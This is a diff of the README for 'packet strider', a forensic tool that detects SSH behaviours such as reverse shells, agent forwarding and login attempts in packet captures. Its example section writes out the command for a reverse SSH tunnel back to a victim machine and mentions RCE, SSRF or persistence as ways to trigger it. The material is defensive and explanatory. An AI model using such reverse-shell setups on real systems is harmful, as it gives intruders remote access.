@@ -13,11 +13,15 @@ Separately to the forensic context, packet strider predictions could also be use
 ## The broad techniques of packet strider (AKA How?)
 - Builds a rich feature set in the form of pandas dataframes. Over 40 features are engineered from packet metadata such as SSH Protocol message content, normalized statistics, direction, size, latency and sliding window features.
 - Strides through this feature set numerous times using sliding windows - Inspired by Convolutional Neural networks - to predict:
-  - Forward and Reverse session initiation (prior to login attempt).
+  - Forward and Reverse session initiation In the case of the Reverse SSH session, this can occur at any point (early, or late) in the forward session. This is discovered prior to the Reverse session being authenticated successfully.
+  - Failed and successful Reverse and Forward logins.
+  - The use -R option in the forward session. This is what enables a Reverse connection to be made. This artefact is discovered very early in the PCAP, directly after the the forward session is authenticated.
+  - The use of the -A option (SSH Agent Forwarding), which enables the client to share it's local SSH private keys with the server. This functionality is generally considered dangerous.
+References:
+https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident
+https://skylightcyber.com/2019/09/26/all-your-cloud-are-belong-to-us-cve-2019-12491/
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12491
   - All predictions and metadata reports on a stream by stream basis.
-  - The use of the -R option in the forward session. This option enables Reverse SSH to occur.
-  - Client's SSH private key shared with server via SSH Agent Forwarding.
-  - Failed and successful logins.
   - Human or scripted, based on timing deltas.
   - Is the server already known to the client? or was it the first time a connection between the two has been made. This is done through packet deltas associated with known_hosts.
   - Whether a client certificate or password auth was used, and if length of password is 8 chars or less.
@@ -75,9 +79,9 @@ optional arguments:
 ## Example
 The pcap "forward_reverse.pcap" is from a common TTP of a Reverse SSH shell, a favorite of red teams everywhere. Specifically the following commands were used, to highlight the capabilities of packet strider in a simple way: 
 - Forward connection from victim
-    - The command for the forward session was `ssh user@1.2.3.4 -R 31337:localhost:22` which binds local port 31337 ready for the reverse SSH connection back to the victim PC. This connection can be effected in many ways including manually, by an RCE, SSRF, or some form of persistence. For the purpose if this demo, it is a manual standard forward session.  
+    - The command for the forward session was `ssh user@1.2.3.4 -R 31337:localhost:22` which binds local port 31337 ready for the reverse SSH connection back to the victim PC. This connection can be effected in many ways including manually, by an RCE, SSRF, or some form of persistence. For the purpose of this demo, it is a manual standard forward session.  
     - This was NOT the first time the client has seen the server , we see this because the delta for related packets was very small , the server's key fingerprint was already in the client's known_hosts, so the user was not prompted to add it - which would increase the latency of packets. 
-   - Two consecutive failed password logins by human, followed by a successful login with an 8+ character password.
+   - Two consecutive failed password logins by a human, followed by a successful login with an 8+ character password.
    - `ls` is typed in forward session, in this sequence: **'l'** 'w' 'w' 'back-space' 'back-space' **'s'** and then enter. The total size of data over the wire that is transmitted (as the output of ls) is classified as infiltration, given that is inbound.
 
 - Now on the attacker's machine (the server), a reverse shell is initiated back to the victim:
